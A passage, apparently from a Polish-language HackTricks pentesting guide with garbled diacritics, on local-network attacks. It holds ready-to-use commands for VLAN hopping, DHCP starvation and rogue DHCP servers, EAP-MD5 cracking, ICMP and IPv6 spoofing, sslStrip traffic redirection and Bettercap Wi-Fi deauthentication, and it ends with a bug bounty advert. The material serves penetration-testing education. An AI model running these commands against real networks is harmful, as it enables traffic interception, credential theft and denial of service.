**VoIP Hopper** oferuje trzy tryby dla protokou Cisco Discovery Protocol (CDP):

1. **Tryb Sniff** (`-c 0`): Analizuje pakiety sieciowe w celu zidentyfikowania identyfikatora VLAN.
2. **Tryb Spoof** (`-c 1`): Generuje niestandardowe pakiety imitujce te z rzeczywistego urzdzenia VoIP.
3. **Tryb Spoof z Wczeniej Utworzonym Pakietem** (`-c 2`): Wysya pakiety identyczne z tymi z okrelonego modelu telefonu IP Cisco.

Preferowany tryb dla szybkoci to trzeci. Wymaga okrelenia:

* Interfejsu sieciowego atakujcego (`-i` parametr).
* Nazwy urzdzenia VoIP, kt贸re jest emulowane (`-E` parametr), zgodnie z formatem nazewnictwa Cisco (np. SEP, a nastpnie adres MAC).

W ustawieniach korporacyjnych, aby zasymulowa istniejce urzdzenie VoIP, mo偶na:

* Sprawdzi etykiet MAC na telefonie.
* Przejrze ustawienia wywietlacza telefonu, aby zobaczy informacje o modelu.
* Podczy urzdzenie VoIP do laptopa i obserwowa 偶dania CDP za pomoc Wireshark.

Przykadowe polecenie do wykonania narzdzia w trzecim trybie byoby:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataki DHCP

#### Wyliczanie
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Istniej **dwa rodzaje atak贸w typu DoS**, kt贸re mo偶na przeprowadzi przeciwko serwerom DHCP. Pierwszy polega na **symulowaniu wystarczajcej liczby faszywych host贸w, aby zu偶y wszystkie mo偶liwe adresy IP**.\
Ten atak zadziaa tylko wtedy, gdy mo偶na zobaczy odpowiedzi serwera DHCP i ukoczy protok贸 (**Odkryj** (Komputer) --> **Oferta** (serwer) --> **呕danie** (Komputer) --> **Potwierdzenie** (serwer)). Na przykad **nie jest to mo偶liwe w sieciach Wifi**.

Innym sposobem przeprowadzenia ataku typu DoS na DHCP jest wysanie **pakietu DHCP-RELEASE, u偶ywajc jako 藕r贸da ka偶dego mo偶liwego adresu IP**. Wtedy serwer bdzie sdzi, 偶e wszyscy zakoczyli korzystanie z danego adresu IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Aby zrobi to bardziej automatycznie, u偶yj narzdzia [DHCPing](https://github.com/kamorin/DHCPig)

Mo偶esz u偶y wspomnianych atak贸w DoS, aby zmusi klient贸w do uzyskania nowych dzier偶aw w rodowisku i wyczerpa prawidowe serwery, aby stay si nieodpowiedzialne. Dlatego gdy prawidowe serwery spr贸buj ponownie poczy si, **mo偶esz serwowa zoliwe wartoci wspomniane w nastpnym ataku**.

#### Ustaw zoliwe wartoci

Rogi serwer DHCP mo偶na skonfigurowa, u偶ywajc skryptu DHCP znajdujcego si w `/usr/share/responder/DHCP.py`. Jest to przydatne do atak贸w sieciowych, takich jak przechwytywanie ruchu HTTP i powiadcze, poprzez przekierowywanie ruchu do zoliwego serwera. Jednak偶e, ustawienie faszywej bramy jest mniej skuteczne, poniewa偶 pozwala tylko na przechwytywanie ruchu wychodzcego z klienta, pomijajc odpowiedzi od prawdziwej bramy. Zamiast tego, zaleca si ustawienie faszywego serwera DNS lub WPAD dla bardziej skutecznego ataku.

Poni偶ej znajduj si opcje polece do konfigurowania faszywego serwera DHCP:

* **Nasz adres IP (Reklama Bramy)**: U偶yj `-i 10.0.0.100`, aby reklamowa IP twojego urzdzenia jako bram.
* **Lokalna nazwa domeny DNS**: Opcjonalnie, u偶yj `-d example.org`, aby ustawi lokaln nazw domeny DNS.
* **Oryginalny Router/Brama IP**: U偶yj `-r 10.0.0.1`, aby okreli adres IP prawidowego routera lub bramy.
* **G贸wny adres IP serwera DNS**: U偶yj `-p 10.0.0.100`, aby ustawi adres IP faszywego serwera DNS, kt贸ry kontrolujesz.
* **Drugi adres IP serwera DNS**: Opcjonalnie, u偶yj `-s 10.0.0.1`, aby ustawi drugi adres IP serwera DNS.
* **Maska podsieci lokalnej sieci**: U偶yj `-n 255.255.255.0`, aby zdefiniowa mask podsieci dla lokalnej sieci.
* **Interfejs do ruchu DHCP**: U偶yj `-I eth1`, aby nasuchiwa ruchu DHCP na okrelonym interfejsie sieciowym.
* **Adres konfiguracji WPAD**: U偶yj `-w http://10.0.0.100/wpad.dat`, aby ustawi adres konfiguracji WPAD, pomagajc w przechwytywaniu ruchu sieciowego.
* **Podszywanie adresu IP domylnej bramy**: Dodaj `-S`, aby podszy adres IP domylnej bramy.
* **Odpowied藕 na wszystkie 偶dania DHCP**: Dodaj `-R`, aby sprawi, 偶e serwer odpowie na wszystkie 偶dania DHCP, ale miej wiadomo, 偶e jest to gone i mo偶e by wykryte.

Poprawne u偶ycie tych opcji pozwala na skuteczne przechwytywanie ruchu sieciowego za pomoc faszywego serwera DHCP.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataki EAP**

Oto kilka taktyk ataku, kt贸re mo偶na wykorzysta przeciwko implementacjom 802.1X:

* Aktywne amanie hasa metod brute-force za pomoc EAP
* Atakowanie serwera RADIUS za pomoc znieksztaconej zawartoci EAP _(eksploity)_
* Przechwytywanie wiadomoci EAP i offline amanie hasa (EAP-MD5 i PEAP)
* Wymuszanie uwierzytelniania EAP-MD5 w celu ominicia weryfikacji certyfikatu TLS
* Wstrzykiwanie zoliwego ruchu sieciowego podczas uwierzytelniania za pomoc koncentratora lub podobnego

Jeli atakujcy znajduje si midzy ofiar a serwerem uwierzytelniania, mo偶e on pr贸bowa zdegradowa (jeli konieczne) protok贸 uwierzytelniania do EAP-MD5 i przechwyci pr贸b uwierzytelnienia. Nastpnie mo偶e on u偶y metody brute-force do:
```
eapmd5pass r pcap.dump w /usr/share/wordlist/sqlmap.txt
```
### Ataki FHRP (GLBP & HSRP) <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) to klasa protoko贸w sieciowych zaprojektowana do **tworzenia gorcego redundantnego systemu routingu**. Dziki FHRP fizyczne routery mog by poczone w pojedyncze urzdzenie logiczne, co zwiksza tolerancj na awarie i pomaga rozo偶y obci偶enie.

**In偶ynierowie firmy Cisco Systems opracowali dwa protokoy FHRP, GLBP i HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Istniej trzy wersje protokou Routing Information Protocol (RIP): RIP, RIPv2 i RIPng. Datagramy s wysyane do r贸wnorzdnych za pomoc portu 520 za pomoc UDP przez RIP i RIPv2, podczas gdy datagramy s nadawane do portu 521 za pomoc multicastu IPv6 przez RIPng. Wersja RIPv2 wprowadzia obsug uwierzytelniania MD5. Z kolei wersja RIPng nie zawiera natywnego uwierzytelniania; zamiast tego polega na opcjonalnych nag贸wkach IPsec AH i ESP w IPv6.

* **RIP i RIPv2:** Komunikacja odbywa si za pomoc datagram贸w UDP na porcie 520.
* **RIPng:** Wykorzystuje port UDP 521 do nadawania datagram贸w za pomoc multicastu IPv6.

Nale偶y zauwa偶y, 偶e RIPv2 obsuguje uwierzytelnianie MD5, podczas gdy RIPng nie zawiera natywnego uwierzytelniania, polegajc na nag贸wkach IPsec AH i ESP w IPv6.

### Ataki EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** to dynamiczny protok贸 routingu. **Jest to protok贸 wektor贸w odlegoci.** Jeli brak jest **uwierzytelniania** i konfiguracji interfejs贸w pasywnych, **intruz** mo偶e zak贸ci routing EIGRP i spowodowa **zatrucie tablic routingu**. Ponadto sie EIGRP (inaczej m贸wic, system autonomiczny) **jest paska i nie ma podziau na strefy**. Jeli **atakujcy wstrzyknie tras**, istnieje du偶e prawdopodobiestwo, 偶e ta trasa **rozprzestrzeni si** w caym autonomicznym systemie EIGRP.

Aby zaatakowa system EIGRP, konieczne jest **ustanowienie ssiedztwa z prawidowym routerem EIGRP**, co otwiera wiele mo偶liwoci, poczwszy od podstawowej rekonesansu po r贸偶ne wstrzyknicia.

[**FRRouting**](https://frrouting.org/) pozwala wdro偶y **wirtualny router obsugujcy BGP, OSPF, EIGRP, RIP i inne protokoy.** Wystarczy go wdro偶y na systemie atakujcego, aby faktycznie udawa prawidowy router w domenie routingu.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) posiada mo偶liwoci przechwytywania nadawanych komunikat贸w EIGRP (Enhanced Interior Gateway Routing Protocol). Umo偶liwia r贸wnie偶 wstrzykiwanie pakiet贸w, kt贸re mo偶na wykorzysta do zmiany konfiguracji routingu.

### OSPF

W protokole Open Shortest Path First (OSPF) **czsto stosuje si uwierzytelnianie MD5 w celu zapewnienia bezpiecznej komunikacji midzy routerami**. Jednak偶e to zabezpieczenie mo偶e zosta zamane za pomoc narzdzi takich jak Loki i John the Ripper. Narzdzia te s zdolne do przechwytywania i amania hase MD5, ujawniajc klucz uwierzytelniania. Gdy klucz ten zostanie uzyskany, mo偶na go u偶y do wprowadzenia nowych informacji o trasowaniu. Aby skonfigurowa parametry trasy i ustali skompromitowany klucz, wykorzystywane s karty _Injection_ i _Connection_.

* **Przechwytywanie i amanie Hase MD5:** Narzdzia takie jak Loki i John the Ripper s u偶ywane w tym celu.
* **Konfigurowanie Parametr贸w Trasy:** Wykonywane jest to za pomoc karty _Injection_.
* **Ustawianie Skompromitowanego Klucza:** Klucz jest konfigurowany w karcie _Connection_.

### Inne Og贸lne Narzdzia i 殴r贸da

* [**Above**](https://github.com/c4s73r/Above): Narzdzie do skanowania ruchu sieciowego i znajdowania podatnoci
* Mo偶esz znale藕 **wicej informacji na temat atak贸w sieciowych** [**tutaj**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Podszywanie**

Atakujcy konfiguruje wszystkie parametry sieciowe (bramka, IP, DNS) nowego czonka sieci, wysyajc faszywe odpowiedzi DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Sprawd藕 [poprzedni sekcj](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect polega na wysyaniu pakietu ICMP typu 1, kod 5, kt贸ry wskazuje, 偶e atakujcy jest najlepsz drog do osignicia danego adresu IP. Nastpnie, gdy ofiara chce skontaktowa si z tym adresem IP, pakiet zostanie wysany przez atakujcego.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### Podmiana DNS

Atakujcy bdzie rozwizywa niekt贸re (lub wszystkie) domeny, o kt贸re prosi ofiara.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Skonfiguruj wasne DNS z dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokalne Bramy

Czsto istnieje wiele tras do system贸w i sieci. Po zbudowaniu listy adres贸w MAC w lokalnej sieci, u偶yj _gateway-finder.py_ do zidentyfikowania host贸w obsugujcych przekazywanie IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Podrabianie LLMNR, NBT-NS i mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Dla lokalnego rozwizywania nazw host贸w, gdy zapytania DNS s nieudane, systemy Microsoft polegaj na **Link-Local Multicast Name Resolution (LLMNR)** oraz na **NetBIOS Name Service (NBT-NS)**. Podobnie, **Apple Bonjour** oraz implementacje **zero-configuration w systemach Linux** wykorzystuj **Multicast DNS (mDNS)** do odkrywania system贸w w sieci. Ze wzgldu na nieuwierzytelniony charakter tych protoko贸w oraz ich dziaanie poprzez UDP, wysyanie komunikat贸w do wszystkich, mog by wykorzystane przez atakujcych, kt贸rzy chc przekierowa u偶ytkownik贸w do zoliwych usug.

Mo偶esz podszywa si pod usugi, kt贸re s wyszukiwane przez hosty, u偶ywajc narzdzia Responder do wysyania faszywych odpowiedzi.\
Dowiedz si wicej o [jak podszywa si pod usugi za pomoc Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Podrabianie WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Przegldarki zazwyczaj korzystaj z protokou **Web Proxy Auto-Discovery (WPAD)** do automatycznego pobierania ustawie proxy. Polega to na pobieraniu szczeg贸贸w konfiguracji z serwera, konkretnie poprzez adres URL, takiego jak "http://wpad.example.org/wpad.dat". Odkrycie tego serwera przez klient贸w mo偶e nastpi poprzez r贸偶ne mechanizmy:

* Poprzez **DHCP**, gdzie odkrycie jest uatwione poprzez wykorzystanie specjalnego wpisu kodu 252.
* Poprzez **DNS**, co polega na wyszukiwaniu nazwy hosta oznaczonej jako _wpad_ w domenie lokalnej.
* Za pomoc **Microsoft LLMNR i NBT-NS**, kt贸re s mechanizmami zapasowymi u偶ywanymi w przypadkach, gdy zapytania DNS nie powiod si.

Narzdzie Responder wykorzystuje ten protok贸, dziaajc jako **zoliwy serwer WPAD**. Wykorzystuje DHCP, DNS, LLMNR i NBT-NS, aby wprowadzi klient贸w w bd i skoni ich do poczenia si z nim. Aby zagbi si w to, jak usugi mog by podszywane za pomoc Responder, [sprawd藕 to](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Podrabianie urzdze SSDP i UPnP](spoofing-ssdp-and-upnp-devices.md)

Mo偶esz oferowa r贸偶ne usugi w sieci, aby **oszuka u偶ytkownika** i skoni go do podania **hasa w postaci zwykego tekstu**. **Wicej informacji na temat tego ataku w** [**Podrabianie urzdze SSDP i UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Podrabianie ssiad贸w IPv6

Ten atak jest bardzo podobny do Podrabiania ARP, ale w wiecie IPv6. Mo偶esz sprawi, 偶e ofiara uwierzy, i偶 adres IPv6 bramy ma MAC atakujcego.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Podrobienie/Przepenienie Reklamy Routera IPv6

Niekt贸re systemy operacyjne domylnie konfiguruj bram z pakiet贸w RA wysyanych w sieci. Aby ogosi atakujcego jako router IPv6, mo偶na u偶y:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Podrabianie DHCP w IPv6

Domylnie niekt贸re systemy operacyjne pr贸buj skonfigurowa DNS, czytajc pakiet DHCPv6 w sieci. Nastpnie atakujcy m贸gby wysa pakiet DHCPv6, aby skonfigurowa siebie jako DNS. DHCP r贸wnie偶 dostarcza adres IPv6 ofierze.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (faszywa strona i wstrzyknicie kodu JS)

## Ataki internetowe

### sslStrip

Podstawowo, co robi ten atak, to w przypadku gdy **u偶ytkownik** pr贸buje **uzyska dostp** do strony **HTTP**, kt贸ra jest **przekierowywana** na wersj **HTTPS**, **sslStrip** bdzie **utrzymywa** poczenie **HTTP z** klientem i poczenie **HTTPS z** serwerem, dziki czemu bdzie m贸g **przechwyci** poczenie w **czystym tekcie**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Wicej informacji [tutaj](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ i dns2proxy do obejcia HSTS

**R贸偶nica** midzy **sslStrip+ a dns2proxy** a **sslStrip** polega na tym, 偶e bd **przekierowywa** na przykad _**www.facebook.com**_ **na** _**wwww.facebook.com**_ (zauwa偶 dodatkowe "**w**") i ustawia **adres tego domeny jako IP atakujcego**. W ten spos贸b **klient** bdzie **czy si** z _**wwww.facebook.com**_ (atakujcy), ale za kulisami **sslstrip+** bdzie **utrzymywa** **rzeczywiste poczenie** za porednictwem https z **www.facebook.com**.

**Celem** tej techniki jest **unikanie HSTS**, poniewa偶 _**wwww**.facebook.com_ **nie** zostanie zapisane w **pamici podrcznej** przegldarki, dziki czemu przegldarka zostanie oszukana, aby wykona **uwierzytelnianie Facebooka w protokole HTTP**.\
Zauwa偶, 偶e aby przeprowadzi ten atak, ofiara musi spr贸bowa uzyska pocztkowy dostp do [http://www.faceook.com](http://www.faceook.com), a nie https. Mo偶na to zrobi, modyfikujc linki wewntrz strony http.

Wicej informacji [tutaj](https://www.bettercap.org/legacy/#hsts-bypass), [tutaj](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) i [tutaj](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip lub sslStrip+ ju偶 nie dziaaj. Dzieje si tak, poniewa偶 w przegldarkach zapisane s reguy HSTS, wic nawet jeli u偶ytkownik pierwszy raz pr贸buje uzyska dostp do "wa偶nej" domeny, uzyska do niej dostp za porednictwem HTTPS. Zauwa偶 r贸wnie偶, 偶e zapisane reguy i inne generowane reguy mog u偶ywa flagi** [**`includeSubdomains`**](https://hstspreload.appspot.com) **wic przykad z _**wwww.facebook.com**_ sprzed chwili ju偶 nie zadziaa, poniewa偶** _**facebook.com**_ **korzysta z HSTS z `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Nasuchiwanie TCP na porcie
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## Nasuch TCP + SSL na porcie

#### Generowanie kluczy i samopodpisanego certyfikatu
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Suchaj za pomoc certyfikatu
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Suchaj za pomoc certyfikatu i przekieruj do host贸w
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Czasami, jeli klient sprawdza, czy CA jest wa偶ne, mo偶esz **udostpni certyfikat innego hosta podpisany przez CA**.\
Innym interesujcym testem jest udostpnienie **certyfikatu 偶danego hosta, ale samopodpisanego**.

Inne rzeczy do przetestowania to pr贸ba podpisania certyfikatu wa偶nym certyfikatem, kt贸ry nie jest wa偶nym CA. Lub u偶ycie wa偶nego klucza publicznego, zmuszenie do u偶ycia algorytmu takiego jak Diffie-Hellman (kt贸ry nie wymaga odszyfrowania niczego za pomoc prawdziwego klucza prywatnego) i gdy klient 偶da sondy prawdziwego klucza prywatnego (jak skr贸tu), wysanie faszywej sondy i oczekiwanie, 偶e klient tego nie sprawdzi.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Aktywne notatki dotyczce odkrywania

Nale偶y wzi pod uwag, 偶e gdy pakiet UDP jest wysyany do urzdzenia, kt贸re nie ma 偶danego portu, wysyany jest ICMP (Port Unreachable).

### **Odkrywanie ARP**

Pakiety ARP s u偶ywane do odkrywania, kt贸re adresy IP s u偶ywane w sieci. Komputer musi wysa 偶danie dla ka偶dego mo偶liwego adresu IP, a tylko te, kt贸re s u偶ywane, odpowiedz.

### **mDNS (multicast DNS)**

Bettercap wysya 偶danie MDNS (co X ms) pytajc o **\_services\_.dns-sd.\_udp.local**. Maszyna, kt贸ra widzi ten pakiet, zazwyczaj odpowiada na to 偶danie. Nastpnie wyszukuje tylko maszyny odpowiadajce na "services".

**Narzdzia**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap wysya pakiety rozgoszeniowe do portu 137/UDP pytajc o nazw "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap wysya pakiety SSDP rozgaszajc poszukiwanie wszelkiego rodzaju usug (Port UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap wysya pakiety WSD rozgaszajc poszukiwanie usug (Port UDP 3702).

## Odnoniki

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Wskaz贸wka dotyczca bug bounty**: **Zarejestruj si** na platformie **Intigriti**, premium platformie **bug bounty stworzonej przez haker贸w, dla haker贸w**! Docz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) ju偶 dzi i zacznij zarabia nagrody a偶 do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
